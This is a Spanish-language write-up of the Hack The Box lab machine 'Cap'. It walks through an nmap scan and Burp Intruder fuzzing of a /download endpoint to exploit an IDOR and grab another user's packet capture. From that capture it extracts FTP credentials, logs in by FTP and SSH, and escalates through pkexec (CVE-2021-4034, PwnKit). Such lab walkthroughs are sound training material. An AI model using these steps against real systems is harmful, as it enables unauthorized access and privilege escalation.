---
layout: post
title: "Cap"
date: 2026-02-09 +0100
tags: ["IDOR"]
os: "Linux"
level: "Easy"
image: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/70ea3357a2d090af11a0953ec8717e90.png"
---

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 17:57 WET
Nmap scan report for 10.129.1.142
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
jaja
```

```


![](/assets/machines/cap.htb/images/329c78bc-b05b-4685-8c54-4fd5a48724d0.webp)

La petición que se hace es al endpoint /download/N

**Burp Suite Intruder**

Con Burp realizamos un ataque de Fuzzing.

```
GET /download/§DOWNLOAD§ HTTP/1.1
Host: 10.10.10.245
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.10.245/data/3
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache

```

El payload 1 y 2 nos pertenecen a nosotros, pero el payload 0 es de otro usuario.
![](/assets/machines/cap.htb/images/14fa71b4-0aea-463e-a848-3ef5198ff6ba.webp)

Abrimos el 0.pcap descargado con Wireshark. Se muestra una conexión FTP con credenciales validas `nathan:Buck3tH4TF0RM3!`.
![](/assets/machines/cap.htb/images/9628a135-076b-4829-9187-41abbb95cdb9.webp)

**Conexión FTP.**

```
ftp 10.10.10.245
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:user): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

**Conexión SSH**

```
ssh nathan@10.10.10.245
```

## Escalado de Privilegios

**SUID**

```
nathan@cap:/tmp$ find / -perm /4000 -type f -exec ls -l {} \; 2>/dev/null
<SNIP>
-rwsr-xr-x 1 root root 31032 Aug 16  2019 /usr/bin/pkexec
```

**CVE-2021-4034**: https://github.com/ly4k/PwnKit

![](/assets/machines/cap.htb/images/17274634-0ffb-4b38-a667-15c20b357015.webp)
